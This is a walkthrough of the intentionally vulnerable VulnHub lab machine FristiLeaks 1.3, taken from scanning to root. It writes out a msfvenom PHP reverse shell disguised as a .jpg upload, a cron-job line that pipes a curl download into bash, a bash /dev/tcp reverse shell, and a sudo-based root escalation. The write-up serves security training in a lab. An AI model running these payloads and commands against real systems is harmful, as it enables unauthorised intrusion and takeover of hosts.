---
title: VulnHub - FristiLeaks 1.3
author: ret2x
date: 2021-11-24 18:50:+0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, file upload]
image:
    path: /assets/images/fristileaks/front.png
---

**Description:** A linux machine hosting a web application vulnerable to File Upload. Bad practices and misconfigurations allowed to get root privileges.

**Author:** Ar0xA

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/fristileaks-13,133/](https://www.vulnhub.com/entry/fristileaks-13,133/)

You need to edit the VM's MAC address to 08:00:27:A5:A6:76 for it to works.

## Information Gathering
### Host Discovery

A ping scan discovered the target machine, the script you can download it [here](https://github.com/ret2x-tools/ping-scan.git).

```console
root@kali:~$ ping-scan.py -r 192.168.179.0/24
192.168.179.169 is up
```

### Port Scanning

The full TCP/UDP scan with unicornscan found only one port.

```console
root@kali:~$ us -mT -Iv 192.168.179.169:a -r 3000 -R 3 && us -mU -Iv 192.168.179.169:a -r 3000 -R 3
...
listener statistics 104316 packets recieved 0 packets droped and 0 interface drops
TCP open                    http[   80]         from 192.168.179.169  ttl 64 
```

### Service Enumeration

Service detection and script scanning was performed against the open port.

```console
root@kali:~$ nmap -v -n -sV -sC -p80 192.168.179.169 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

### Web Enumeration

Nothing was found in the web page including the robots.txt file.

![](/assets/images/fristileaks/screenshot-1.png)


```console
root@kali:~$ curl http://192.168.179.169/robots.txt                           
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

Reading the image of the home page I tried to look up the word **fristi** in the browser and it redirected me to an admin page.

![](/assets/images/fristileaks/screenshot-2.png)

In the source of the page I found the user **eezeepz**, and at the bottom of the page a base 64 encoded string.

![](/assets/images/fristileaks/screenshot-3.png)

![](/assets/images/fristileaks/screenshot-4.png)


I decoded the base 64 string, this contains an image with a password.

```console
root@kali:~$ curl -s http://192.168.179.169/fristi/ | sed -n '1703,1724p' | base64 -d > image.png

root@kali:~$ ristretto image.png
```

![](/assets/images/fristileaks/screenshot-5.png)

I logged in with those creds and has access to a file upload page.

![](/assets/images/fristileaks/screenshot-6.png)

![](/assets/images/fristileaks/screenshot-7.png)

## Exploitation
### File Upload

To bypass the file upload functionality was possible adding the jpg extension to the php reverse shell.

```console
root@kali:~$ msfvenom -p php/reverse_perl LHOST=192.168.179.1 LPORT=443 -o z.php.jpg
```

We upload the reverse shell, this was created successfully into the uploads directory.

![](/assets/images/fristileaks/screenshot-8.png)

![](/assets/images/fristileaks/screenshot-9.png)

We start a netcat listener on port 443 and run the following curl request.

```console
root@kali:~$ curl http://192.168.179.169/fristi/uploads/z.php.jpg
```

We get a shell with apache permissions.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.169] 34123
id
uid=48(apache) gid=48(apache) groups=48(apache)
script -qc /bin/bash /dev/null
bash-4.1$ 
```

I found a note in the **/var/www/** directory for **eezeepz**, this catches my attention.

```console
bash-4.1$ cd /var/www
cd /var/www
bash-4.1$ ls 
ls 
cgi-bin  error  html  icons  notes.txt
bash-4.1$ cat notes.txt 
cat notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```

There are many files in eezeepzs's home directory .

```console
bash-4.1$ cd /home/eezeepz
bash-4.1$ ls 
MAKEDEV    chown        hostname  netreport       taskset     weak-modules
cbq        clock        hwclock   netstat         tc          wipefs
cciss_id   consoletype  kbd_mode  new-kernel-pkg  telinit     xfs_repair
cfdisk     cpio         kill      nice            touch       ypdomainname
chcpu      cryptsetup   killall5  nisdomainname   tracepath   zcat
chgrp      ctrlaltdel   kpartx    nologin         tracepath6  zic
chkconfig  cut          nameif    notes.txt       true
chmod      halt         nano      tar             tune2fs
```

The notes.txt file contains a message that we can use the binaries specifying the full path **/usr/bin/** or **/home/admin/**, we can write our commands ia a file called **runthis** in /tmp directory, a cron job is working behind this.

```console
bash-4.1$ cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

## Privilege Escalation
### Cron Job

A cron job with admin permissions is running, we can see it by listing the processes.

```console
bash-4.1$ ps auxwe | grep admin
ps auxwe | grep admin
admin     2063  0.0  0.7 115048  3768 ?        Ss   03:59   0:00 /usr/bin/python /home/admin/cronjob.py
```

To get a shell as the user **admin**, I created the **runthis** file with a curl command that downloads our bash reverse shell and executes it, and finally I give it execute perisssions.

```console
bash-4.1$ echo '/usr/bin/curl 192.168.179.1:8000/getadmin | bash' > /tmp/runthis
bash-4.1$ chmod +x /tmp/runthis
```

On the attacking machine I create a bash reverse shell and start a web server with python.

```console
root@kali:~$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.179.1/1337 0>&1"' > getadmin
root@kali:~$ python3 -m http.server 
```

We wait a moment and we have a shell as user **admin**.

```console
root@kali:~$ nc -vlnp 1337
listening on [any] 1337 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.169] 50841
bash: no job control in this shell
[admin@localhost ~]$ python -c "import pty; pty.spawn('/bin/bash')"
[admin@localhost ~]$ id
id
uid=501(admin) gid=501(admin) groups=501(admin)
```

In the home directory there are two files that contain an encoded string.

```console
[admin@localhost ~]$ cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

[admin@localhost ~]$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
```

Also was found a python script that encodes a string to base64, rot13 and reverts it.

```console
[admin@localhost ~]$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

The following python script performs the reverse process.

```python
#!/usr/bin/env python3

import sys
import base64
import codecs

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} [string]")
    sys.exit(0)

string = sys.argv[1]

# Decode the Rot13 string
def decodeRot13(x):
    return codecs.decode(x, 'rot13')

# Reverse the string
def revString(x):
   return x[::-1]

# Decode the base64 string
def b64Decode(y):
    string = base64.b64decode(y)
    return string.decode('utf-8')

txt = b64Decode(decodeRot13(revString(string)))
print(txt)
```

### Password Disclosure

We run the script and get the password for **fristigod** user.

```console
root@kali:~$ python3 decryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG 
LetThereBeFristi!
```

We switched to the user **fristigod**.

```console
[admin@localhost ~]$ su - fristigod
su - fristigod
Password: LetThereBeFristi!

-bash-4.1$ id
id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
```

Listing the sudo permissions, we see that **fristigod** can execue the **doCom** script as user fristi.

```console
-bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

### Sudo Permissions

To get root we need to run **doCom** script as user **fristi** and add bash as parameter.

```console
-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
bash-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)


bash-4.1# cd /root
cd /root
bash-4.1# ls
ls
fristileaks_secrets.txt
bash-4.1# cat fristileaks_secrets.txt
cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```
